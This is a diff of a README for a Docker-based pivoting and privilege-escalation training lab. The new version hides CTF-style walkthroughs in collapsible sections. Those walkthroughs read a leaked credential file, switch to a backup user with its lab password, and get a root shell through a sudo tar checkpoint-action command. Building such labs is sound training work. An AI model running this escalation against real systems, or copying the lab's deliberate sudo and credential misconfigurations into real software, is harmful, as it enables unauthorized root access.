@@ -1,6 +1,8 @@
-Here’s a polished **GitHub-style README** with badges, clean sections, and a professional lab vibe.
+Absolutely — GitHub supports collapsible sections using `<details>` and `<summary>`. That’s perfect for hiding the attack path and solution while keeping the README clean.
 
-You can paste this directly into `README.md`.
+Below is your modified GitHub-style README section with the path and solution hidden behind click-to-reveal blocks.
+
+You can paste this directly into your `README.md`.
 
 ---
 
@@ -9,7 +11,7 @@ You can paste this directly into `README.md`.
 ![Docker](https://img.shields.io/badge/Docker-Required-blue)
 ![Compose](https://img.shields.io/badge/Docker%20Compose-v2+-blue)
 ![Mode](https://img.shields.io/badge/Modes-Sysadmin%20%7C%20CTF-purple)
-![License](https://img.shields.io/badge/Lab-Private-lightgrey)
+![Lab](https://img.shields.io/badge/Purpose-Training-lightgrey)
 
 A reproducible, profile-driven multi-hop pivoting lab built entirely with Docker.
 
@@ -22,13 +24,11 @@ Designed for practicing:
 * Internal network segmentation
 * Lateral movement simulation
 
-This lab runs completely offline and is portable across systems.
-
 ---
 
 # 🗺 Architecture
 
-```
+```text
 Kali VM
   │
   ├── dmz_net (172.31.50.0/24)
@@ -41,84 +41,123 @@ Kali VM
           └── target (nginx)
 ```
 
-### Key Design Goals
-
-* Strict network segmentation
-* Realistic Linux user structure
-* Intentional misconfigurations
-* Scenario-driven attack paths
-* Clean profile switching
-
 ---
 
-# 🧩 Lab Modes (Profiles)
-
-This lab uses Docker Compose profiles to simulate different environments.
+# 🧩 Lab Modes
 
 ---
 
 ## 🔵 Sysadmin Misconfiguration Mode
 
-Simulates an operational mistake commonly seen in internal environments.
-
-### Scenario
-
-* Cron job runs as `backup`
-* World-readable environment file leaks credentials
-* `backup` has limited sudo access (`tar` NOPASSWD)
-
-### Attack Flow
-
-```
-websvc → discover leaked env → su backup → sudo tar → root
-```
-
-### Run It
+Simulates a realistic operational mistake in an internal Linux environment.
 
 ```bash
 docker compose --profile sysadmin up -d --build
 ```
 
----
+<details>
+<summary><strong>▶ Reveal Suggested Attack Path</strong></summary>
 
-## 🔴 CTF Mode
+### Enumeration
 
-Puzzle-style scenario with intentional clues.
-
-### Scenario
-
-* Encoded credential clue in web directory
-* Requires discovery and decoding
-* Same privilege escalation path
-
-### Run It
-
-```bash
-docker compose --profile ctf up -d --build
-```
-
----
-
-# 🚀 Quick Start
-
-### 1️⃣ Build and Launch
-
-```bash
-docker compose --profile sysadmin up -d --build
-```
-
-### 2️⃣ Start from Low Privilege
+Start as low-privileged user:
 
 ```bash
 docker exec -it -u websvc pivot1 bash
 ```
 
-### 3️⃣ Begin Enumeration
+Check for operational artifacts:
 
 ```bash
-ls /home
+ls -la /usr/local/bin
 cat /usr/local/bin/.backup_env
 ```
+
+You should discover:
+
+```
+BACKUP_PASS=backup123
+```
+
+---
+
+### User Pivot
+
+```bash
+su - backup
+# password: backup123
+```
+
+---
+
+### Privilege Escalation
+
+Enumerate sudo:
+
+```bash
+sudo -l
+```
+
+Exploit tar permission:
+
+```bash
+sudo tar -cf /dev/null /dev/null \
+  --checkpoint=1 \
+  --checkpoint-action=exec=/bin/bash
+```
+
+You now have root.
+
+</details>
+
+---
+
+## 🔴 CTF Mode
+
+Puzzle-style challenge mode with encoded clues.
+
+```bash
+docker compose --profile ctf up -d --build
+```
+
+<details>
+<summary><strong>▶ Reveal Suggested Attack Path</strong></summary>
+
+### Find the Clue
+
+Start as:
+
+```bash
+docker exec -it -u websvc pivot1 bash
+```
+
+Search web directory:
+
+```bash
+cat /var/www/html/notes.txt
+```
+
+Decode:
+
+```bash
+echo "<base64_string>" | base64 -d
+```
+
+This reveals the backup password.
+
+---
+
+### Pivot and Escalate
+
+```bash
+su - backup
+sudo -l
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+```
+
+Root achieved.
+
+</details>
 
 ---
 
@@ -130,95 +169,19 @@ cat /usr/local/bin/.backup_env
 | backup | Operational account (misconfigured sudo) |
 | admin  | Standard interactive user                |
 
-**Passwords (for lab purposes only):**
-
-```
-backup → backup123
-admin  → Winter2024!
-```
-
 ---
 
-# 📁 Project Structure
-
-```
-.
-├── docker-compose.yml
-├── Dockerfile.pivot
-├── entrypoint.sh
-├── profiles/
-│   ├── sysadmin/
-│   │   └── seed/
-│   └── ctf/
-│       └── seed/
-```
-
-### Components
-
-* **Dockerfile.pivot**
-  Base pivot image with users, tools, and sudo configuration.
-
-* **entrypoint.sh**
-  Applies profile-specific seed artifacts at runtime.
-
-* **profiles/**
-  Scenario-specific files injected into pivots.
-
----
-
-# 🔧 Requirements
-
-* Docker
-* Docker Compose (v2+)
-* Kali VM (recommended)
-* Network interface supporting macvlan
-
-Check your interface:
-
-```bash
-ip -br addr
-```
-
-Update `parent:` in `docker-compose.yml` if not `eth0`.
-
----
-
-# 🔄 Switching Modes Cleanly
-
-When switching profiles, remove the seed volume:
+# 🔄 Switching Modes
 
 ```bash
 docker compose --profile sysadmin down -v
 docker volume rm ligololab_seed 2>/dev/null || true
 ```
 
-Then start the other mode:
+Then:
 
 ```bash
 docker compose --profile ctf up -d --build
-```
-
----
-
-# 🧪 Suggested Practice Objectives
-
-* Enumerate Linux users correctly (don’t rely only on `/home`)
-* Identify operational accounts
-* Locate leaked credentials
-* Pivot users safely
-* Escalate via limited sudo
-* Access internal-only services via multi-hop tunneling
-
----
-
-# 🧹 Cleanup
-
-Stop and remove everything:
-
-```bash
-docker compose down -v
-docker network prune -f
-docker volume prune -f
 ```
 
 ---
@@ -231,14 +194,4 @@ This lab is intended for:
 * Private research
 * Controlled experimentation
 
-Do **not** expose these containers to public networks.
-
----
-
-# 📌 Future Enhancements
-
-* Internal-only database service
-* SSH lateral movement simulation
-* Credential reuse between pivots
-* Logging & detection simulation
-* Blue-team monitoring variant
+Do not expose to public networks.
